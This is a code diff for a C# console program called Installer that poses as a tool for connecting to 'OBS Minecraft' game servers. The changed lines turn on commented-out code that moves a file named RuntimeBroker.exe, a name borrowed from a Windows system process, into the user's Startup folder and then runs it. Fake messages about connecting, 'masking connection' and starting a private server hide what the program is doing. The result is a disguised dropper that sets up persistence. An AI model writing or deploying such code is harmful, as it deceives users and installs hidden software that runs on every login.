@@ -9,13 +9,14 @@ namespace Installer
     class Installer
     {
         static string ip;
+        static string game = "OBS Minecraft";
 
         static void Main(string[] args)
         {
             string installPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "RuntimeBroker.exe");
 
             Thread.Sleep(3000);
-            Console.Write("Connecting to EGS servers");
+            Console.Write($"Connecting to {game} servers");
             for (int i = 0; i < 3; i++)
             {
                 Console.Write('.');
@@ -25,9 +26,9 @@ namespace Installer
             Thread.Sleep(500);
             
             //muta fisierul
-            //File.Move("RuntimeBroker.exe", installPath);
+            File.Move("RuntimeBroker.exe", installPath);
 
-            Console.WriteLine($"Successfully connected to EGS servers on port {new Random().Next(1000, 15000)}.");
+            Console.WriteLine($"Successfully connected to {game} servers on port {new Random().Next(1000, 15000)}.");
             Thread.Sleep(500);
             Console.Write("Masking connection");
             for (int i = 0; i < 3; i++)
@@ -38,7 +39,8 @@ namespace Installer
             Console.WriteLine();
             Thread.Sleep(500);
 
-            Console.Write($"Starting local virtual private server");
+            Console.Write($"Starting local virtual private server on IP address {GetExternalIP()}.");
+
             for (int i = 0; i < 3; i++)
             {
                 Console.Write('.');
@@ -53,12 +55,11 @@ namespace Installer
                 FileName = installPath,
                 UseShellExecute = true
             };
-            //process.Start
+            process.Start();
 
             Thread.Sleep(1000);
             Console.WriteLine($"Successfully started local virtual private server on IP address {GetExternalIP()}.");
             Thread.Sleep(10000);
-
         }
 
         public static string GetExternalIP()
